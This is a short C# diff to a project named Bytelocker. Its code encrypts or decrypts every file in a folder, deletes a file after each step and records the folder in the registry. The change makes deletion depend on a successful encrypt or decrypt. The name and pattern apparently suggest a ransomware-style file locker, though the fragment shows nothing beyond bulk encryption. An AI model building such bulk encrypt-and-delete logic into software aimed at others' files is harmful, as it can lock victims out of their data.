@@ -28,8 +28,10 @@ namespace Bytelocker.CryptoManager
                     {
                         fm.ChooseFile(file_path);
                         fm.SetupFileEncrypter();
-                        fm.DecryptFile();
-                        fm.DeleteFile();
+                        if (fm.DecryptFile())
+                        {
+                            fm.DeleteFile();
+                        }
                     }
 
                     rm.DeleteBoolValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path);
@@ -60,8 +62,10 @@ namespace Bytelocker.CryptoManager
                     {
                         fm.ChooseFile(file_path);
                         fm.SetupFileEncrypter();
-                        fm.EncryptFile();
-                        fm.DeleteFile();
+                        if (fm.EncryptFile())
+                        {
+                            fm.DeleteFile();
+                        }
                     }
 
                     rm.CreateBoolValue(RegistryManager.FOLDER_KEY_NAME, this.dir_path, true);
